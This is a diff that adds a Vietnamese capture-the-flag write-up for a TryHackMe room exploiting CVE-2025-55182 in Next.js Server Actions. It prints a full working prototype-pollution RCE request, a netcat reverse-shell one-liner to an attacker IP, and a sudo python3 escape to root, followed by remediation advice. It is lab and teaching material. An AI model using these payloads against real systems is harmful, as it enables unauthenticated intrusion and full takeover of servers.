@@ -1,6 +1,6 @@
 ---
 title: 'Corp Website'
-description: '[[THIẾU MÔ TẢ]]'
+description: 'Khai thác CVE-2025-55182 — lỗ hổng prototype pollution RCE trong Next.js Server Actions — rồi leo quyền root qua một quy tắc sudo không mật khẩu.'
 date: 2026-10-05
 platform: tryhackme
 room: 'Corp Website'
@@ -8,8 +8,245 @@ roomUrl: 'https://tryhackme.com/room/lafb2026e7'
 difficulty: medium
 tags: [web, nextjs, rce, cve-2025-55182, sudo, docker]
 vulnClasses: [Prototype Pollution, Remote Code Execution, SUID / Sudo Misconfiguration]
-translation: pending
-draft: true
+translation: done
+draft: false
 ---
 
-Bản dịch tiếng Việt đang được chuẩn bị. Đọc bản tiếng Anh.
+## TryHackMe: Corp Website — RCE trong Next.js Server Actions và một Dockerfile khai hết mọi thứ
+
+_Lời giải thử thách "Corp Website" từ sự kiện Love at First Breach 2026. Một ứng dụng Next.js ở cổng 3000 dính CVE-2025-55182 — một lỗ hổng prototype-pollution RCE trong Server Actions. Một request POST multipart được chế tác cho ta một shell; đọc Dockerfile lộ ra một quy tắc_ _`sudo python3`_ _không mật khẩu, leo thẳng lên root._
+
+> Các giá trị flag đã được che. Corp Website là một thử thách trên sự kiện TryHackMe được phép.
+
+---
+
+### TL;DR — toàn bộ chuỗi
+
+<Callout type="tldr">
+
+Nhận diện Next.js từ response header → CVE-2025-55182 prototype-pollution RCE trong Server Actions → reverse shell với tư cách `daniel` → đọc `Dockerfile` → `sudo python3` NOPASSWD → **root**.
+
+</Callout>
+
+### Mục tiêu
+
+```text
+export IP=10.48.168.0
+nmap -sC -sV -p 3000 $IP
+```
+
+```text
+3000/tcp open  http  Next.js
+X-Powered-By: Next.js
+x-nextjs-cache: HIT
+```
+
+Chỉ một cổng. Header `X-Powered-By: Next.js` và nhóm header `x-nextjs-*` làm lộ ngay framework mà không cần brute-force thư mục nào.
+
+---
+
+### Liệt kê: nhận diện framework
+
+Đọc mã nguồn HTML xác nhận bố cục file Next.js kinh điển — các chunk `/_next/static/`, thẻ script `__NEXT_DATA__`, build hash trong URL preload font. Chỉ riêng fingerprint từ nmap đã đủ để chuyển thẳng sang tra cứu CVE.
+
+Tìm "Next.js RCE 2025" làm lộ ra **CVE-2025-55182**, biệt danh _react2shell_: một lỗ hổng thực thi mã từ xa không cần xác thực trong Next.js Server Actions, sinh ra từ giao thức React Server Components.
+
+---
+
+### CVE-2025-55182 — nó là gì và vì sao hoạt động
+
+#### Server Actions và định dạng truyền RSC
+
+Server Actions của Next.js là các hàm `async` được đánh dấu `"use server"`, chạy trên server và gọi được từ trình duyệt qua một POST multipart đặc biệt. Trình duyệt gửi một header `Next-Action` chứa ID của action, và body là một form multipart mà các phần của nó là payload giao thức React Flight (RSC) mã hóa dạng JSON.
+
+Giao thức RSC dùng một hệ tham chiếu (`$1`, `$B1337`, `$Q2`…) để phân giải lười (lazy) các đối tượng qua các chunk được stream. Điểm mấu chốt: nó gọi `JSON.parse` trên các chunk đó rồi phân giải các đường dẫn thuộc tính một cách động — bao gồm cả đường dẫn đi qua `__proto__`.
+
+#### Primitive prototype pollution
+
+Payload cấy một tham chiếu qua `__proto__`:
+
+```text
+{
+  "then": "$1:__proto__:then",
+  "status": "resolved_model",
+  "value": "{\"then\":\"$B1337\"}",
+  "_response": {
+    "_prefix": "<arbitrary JS>",
+    "_chunks": "$Q2",
+    "_formData": { "get": "$1:constructor:constructor" }
+  }
+}
+```
+
+Đi theo `$1:__proto__:then` sẽ làm ô nhiễm `Object.prototype.then`, khiến mọi đối tượng thường trông như một thenable (một Promise). Bộ giải tuần tự hóa (deserialiser) của RSC khi đó gọi `.then()` trên nó, phân giải ra hàm lưu trong `_prefix` — được thực thi qua `constructor.constructor`, tức bộ dựng `Function`. Kết quả: JavaScript tùy ý chạy bên trong Node.js với quyền của tiến trình web.
+
+#### Xác nhận RCE
+
+Request khai thác đầy đủ (cũng chạy được với `curl` hoặc Burp Repeater):
+
+```text
+POST /HTTP/1.1
+Host: 10.48.168.0:3000
+Next-Action: x
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
+
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="0"
+
+{
+  "then": "$1:__proto__:then",
+  "status": "resolved_model",
+  "reason": -1,
+  "value": "{\"then\":\"$B1337\"}",
+  "_response": {
+    "_prefix": "var res=process.mainModule.require('child_process').execSync('id',{'timeout':5000}).toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});",
+    "_chunks": "$Q2",
+    "_formData": { "get": "$1:constructor:constructor" }
+  }
+}
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="1"
+
+"$@0"
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="2"
+
+[]
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
+```
+
+Kết quả của `id` quay về trong trường `digest` của lỗi `NEXT_REDIRECT` — hiện ra trong body phản hồi. RCE được xác nhận mà không cần xác thực nào.
+
+<Callout type="insight">
+
+Mẹo nhét kết quả lệnh vào trong trường `digest` của một lỗi được ném ra là một bước chuyển kinh điển từ "mù" sang "nửa mù": thông thường bạn không đọc được `stdout` từ một lỗi redirect, nhưng Next.js lặp lại nguyên văn chuỗi `digest` trong phản hồi HTTP.
+
+</Callout>
+
+---
+
+### Truy cập ban đầu — reverse shell
+
+Chế tác lệnh reverse shell và nhúng nó làm giá trị `_prefix`:
+
+```text
+# attacker
+nc -lvnp 4444
+```
+
+`_prefix` của payload:
+
+```text
+process.mainModule.require('child_process').execSync(
+  'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.140.77 4444 >/tmp/f',
+  {'timeout': 10000}
+)
+```
+
+Gửi request → shell đáp về:
+
+```text
+connect to [192.168.140.77] from (UNKNOWN) [10.49.145.232] 50124
+/bin/sh: can't access tty; job control turned off
+/app $
+```
+
+Khám phá các thư mục home:
+
+```text
+/app $ cd /home && ls -al
+drwxr-sr-x  daniel  secgroup
+drwxr-sr-x  node    node
+
+/home $ cd daniel && cat user.txt
+THM{[REDACTED]}
+```
+
+---
+
+### Leo quyền — Dockerfile khai hết
+
+Thư mục làm việc là `/app`, và ứng dụng đi kèm `Dockerfile` của chính nó. Đọc nó chính là toàn bộ việc leo quyền:
+
+```text
+cat /app/Dockerfile
+```
+
+```text
+FROM node:20-alpine
+
+RUN apk add --no-cache sudo python3 netcat-openbsd
+
+WORKDIR /app
+...
+RUN addgroup -S secgroup && adduser -S daniel -G secgroup
+RUN chown -R daniel:secgroup /app
+
+RUN echo"daniel ALL=(root) NOPASSWD: /usr/bin/python3" >> /etc/sudoers
+
+USER daniel
+EXPOSE 3000
+CMD ["npm","start"]
+```
+
+`daniel` có thể chạy `/usr/bin/python3` với tư cách root mà không cần mật khẩu. Cú thoát sudo chuẩn của Python:
+
+```text
+sudo python3 -c 'import os; os.execv("/bin/sh", ["/bin/sh"])'
+```
+
+```text
+/app # id
+uid=0(root) gid=0(root)
+/app # cat /root/root.txt
+THM{[REDACTED]}
+```
+
+---
+
+### Vì sao Dockerfile quan trọng hơn chỉ là "nó có một quy tắc sudo"
+
+Dockerfile là hướng dẫn build, không phải bí mật lúc chạy — nhưng chúng thường bị commit vào repository và đóng gói vào bên trong image cuối. Đọc được chúng từ một điểm đặt chân trao cho kẻ tấn công:
+
+- **Quy tắc sudo bị phơi ra** (như ở đây)
+- **Bí mật ghi cứng** (`ENV DB_PASSWORD=…`, `RUN echo "<token>" > /root/…`)
+- **Giá trị flag nhúng thẳng** trong các dòng `RUN echo "…" >`
+- **Phiên bản dependency** hữu ích cho việc tra cứu CVE tiếp theo
+
+Nếu một Dockerfile truy cập được từ một shell quyền thấp, hãy coi nó như một file chiến lợi phẩm.
+
+---
+
+### Mức độ nghiêm trọng
+
+<Callout type="critical">
+
+**Tới hạn.** CVE-2025-55182 không cần xác thực và chỉ cần một request HTTP duy nhất. Kết hợp với một quy tắc sudo không mật khẩu cho `python3`, root hoàn toàn là một quy trình hai bước mà không cần thông tin đăng nhập nào ở bất kỳ điểm nào.
+
+</Callout>
+
+---
+
+### Khắc phục
+
+<Callout type="fix">
+
+1. **Nâng cấp Next.js** — CVE-2025-55182 đã được vá ở các phiên bản sau advisory. Ghim một phiên bản đã vá và bật Dependabot / Renovate để tự động cảnh báo.
+2. **Xác thực ID** **`Next-Action`** — Server Action hợp lệ có ID băm xác định. Từ chối các request có giá trị `Next-Action` không khớp một action đã biết được đăng ký lúc build.
+3. **Nguyên tắc đặc quyền tối thiểu cho tiến trình web** — người dùng của ứng dụng không nên có quyền sudo nào, nói gì tới `NOPASSWD: /usr/bin/python3`. Xóa dòng sudoers; nếu cần leo quyền cho một tác vụ cụ thể, dùng một wrapper phạm vi hẹp có xác thực tham số.
+4. **Đừng đóng gói Dockerfile vào trong image** — thêm `Dockerfile` và `.dockerignore` vào `.dockerignore` để metadata build không đọc được từ bên trong một container đang chạy.
+5. **Không bao giờ nhúng bí mật hay flag trong** **`RUN echo`** — chúng in vào các layer của image và đọc được bởi bất kỳ ai có quyền shell. Dùng Docker secrets hoặc tiêm biến môi trường lúc chạy.
+
+</Callout>
+
+---
+
+### Điểm rút ra
+
+- **Header** **`X-Powered-By`** **và** **`x-nextjs-*`** **nhận diện framework chỉ trong một request.** Tắt hoặc loại bỏ các header mang thông tin trong production.
+- **CVE-2025-55182 không cần xác thực nào.** Bất kỳ app Next.js nào dùng Server Actions trên một phiên bản dính lỗi đều khai thác được từ internet chỉ với một lệnh curl.
+- **Prototype pollution qua** **`__proto__`** **trong giải tuần tự JSON là một lớp lỗi lặp đi lặp lại.** Định dạng truyền RSC phức tạp; sự phức tạp sinh ra các "gadget" giải tuần tự.
+- **Đọc mọi file trong thư mục làm việc.** `Dockerfile`, `.env`, `config.js`, `docker-compose.yml` — các artefact build và triển khai bị bỏ lại trong container thường chứa bước tiếp theo.
+- **`sudo <trình thông dịch> NOPASSWD`** **thực chất là root.** Python, node, perl, ruby, lua — bất kỳ trình thông dịch nào có thể sinh tiến trình con đều biến quy tắc sudo thành một dòng lệnh dẫn tới shell root.
+
+Cảm ơn bạn đã đọc. Corp Website là một màn hai bước gọn gàng cho thấy lựa chọn framework có ý nghĩa — đóng gói một phiên bản Next.js đã biết lỗ hổng cùng một quy tắc sudo dễ dãi biến một trang giới thiệu doanh nghiệp thành một shell root mở toang.
